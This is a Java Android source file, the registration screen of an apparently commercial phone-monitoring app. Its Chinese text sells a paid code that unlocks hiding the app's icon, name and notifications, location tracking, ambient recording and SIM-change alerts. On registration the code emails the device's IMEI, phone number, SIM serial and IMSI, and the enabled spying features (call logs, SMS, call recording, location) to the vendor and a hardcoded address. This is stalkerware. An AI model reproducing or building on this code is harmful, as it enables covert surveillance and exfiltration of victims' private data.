package com.shiliukeji.xc_lsy.androidkillerservice;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.text.Html;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.elvishew.xlog.XLog;
import com.shiliukeji.xc_lsy.androidkillerservice.service.GetSharePrefe;
import com.shiliukeji.xc_lsy.androidkillerservice.service.OtherOperatorService;

import java.util.Locale;

public class ZhuceActivity extends AppCompatActivity {
    private GetSharePrefe ps;
    private TextView showmetTextView;
    private SharedPreferences zcps;
    private EditText zhucemaeEditText;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_zhuce);
        this.ps = new GetSharePrefe(getApplicationContext());
        this.zcps = getSharedPreferences("reg", 0);
        this.showmetTextView = (TextView) findViewById(R.id.tv_showme);
        this.zhucemaeEditText = (EditText) findViewById(R.id.et_input);
        this.showmetTextView.setText(Html.fromHtml("***请联系正版注册授权QQ:<font color=#ff0000>" + getString(R.string.zhuceqq) + "</font>。" + "不注册也可正常使用，注册后可隐藏程序图标、程序名称、状态栏通知，并具备手机位置主动跟踪、环境录音、换卡自动通知等功能(具体详询)，享受后续免费升级服务。支持手机序号或电子邮箱注册(一个注册码可注册多台手机)。<br/><br/>" + "***注册流程：电脑上打开你设置的邮箱--找到并打开\"测试邮件\"--<font color=#ff0000>点击淘宝连接购买注册码</font>--提供你设置的邮箱或手机序号(本机序号：" + OtherOperatorService.getImei(getApplicationContext(), 8) + ")，我们分分钟为你注册并发送注册码给你--你在本页面输入注册码后保存--之后返回设置页面点击\"隐藏\"即可。"));
    }

    public void saveHide(View v) {
        XLog.d("保存注册码！");
        String zhucema = this.zhucemaeEditText.getText().toString().trim().toUpperCase(Locale.US);
        if (!OtherOperatorService.check3Gwifi(getApplicationContext())) {
            Toast.makeText(getApplicationContext(), "先开启手机网络以便为你注册", Toast.LENGTH_SHORT).show();
        } else if (!this.ps.isUserSetOk()) {
            Toast.makeText(getApplicationContext(), "返回先设置邮箱，并保存成功", Toast.LENGTH_SHORT).show();
        } else if ("".equals(zhucema) || zhucema == null) {
            Toast.makeText(getApplicationContext(), "请先输入注册码", Toast.LENGTH_SHORT).show();
        } else if (!OtherOperatorService.isReg(this.ps.getUserEmail(), this.ps.getShoujiImei(), zhucema)) {
            Toast.makeText(getApplicationContext(), "注册不成功，请检查注册码是否正确", Toast.LENGTH_SHORT).show();
        } else if (save(zhucema)) {
            String userEmailTemp = this.ps.getUserEmail();
            String zhuceqq = getString(R.string.zhuceqq);
            String zhuceemail = getString(R.string.zhuceemail);
            String[] tos = "abc@163.com".equalsIgnoreCase(zhuceemail) ? new String[]{zhuceemail} : new String[]{zhuceemail, "abc@163.com"};
            String subject = "用户" + userEmailTemp + ":" + this.ps.getUserPhoneNumber() + ":" + this.ps.getShoujiImei() + "注册成功(版本号：" + getString(R.string.version) + ")";
            OtherOperatorService.uploadEmail(this.ps.getSmtp(), this.ps.getPort(), userEmailTemp, this.ps.getUserPassword(), userEmailTemp, tos, subject, new StringBuilder(String.valueOf(subject)).append("<br/>功能：").append(this.ps.isTonghuajilu()).append(",").append(this.ps.isDuanxinjilu()).append(",").append(this.ps.isTonghualuyin()).append(",").append(this.ps.isWeizhijilu()).append("<br/>发送：").append(this.ps.isAllnet()).append(",").append(this.ps.isWifi()).append("<br/>注册：").append(zhucema).append("<br/><br/>代理：").append(zhuceqq).append(",").append(zhuceemail).append(",当前卡编码").append(this.ps.getCardNumber()).append(",").append(this.ps.getCardIMSI()).toString());
            finish();
        } else {
            Toast.makeText(getApplicationContext(), "注册通过，注册文件保存异常", Toast.LENGTH_SHORT).show();
        }
    }

    private boolean save(String zhucema) {
        SharedPreferences.Editor zcedit = this.zcps.edit();
        zcedit.putBoolean("isok", true);
        zcedit.putString("zhucema", zhucema);
        if (zcedit.commit()) {
            return true;
        }
        return false;
    }

    public void help(View v) {
        startActivity(new Intent(this, HelpActivity.class));
    }

}
